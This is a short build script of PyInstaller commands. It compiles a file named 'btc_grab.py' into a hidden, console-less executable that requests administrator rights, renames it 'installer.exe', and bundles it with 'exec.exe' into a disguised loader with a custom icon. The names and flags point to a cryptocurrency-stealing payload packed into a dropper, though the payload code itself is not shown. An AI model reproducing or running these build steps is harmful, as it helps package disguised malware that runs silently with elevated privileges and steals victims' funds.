pyinstaller.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\btc_grab.py
copy dist\btc_grab.exe .\installer.exe
pyinstaller.exe --add-binary="installer.exe;." --add-binary="exec.exe;." --icon=icon.ico --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader2.py
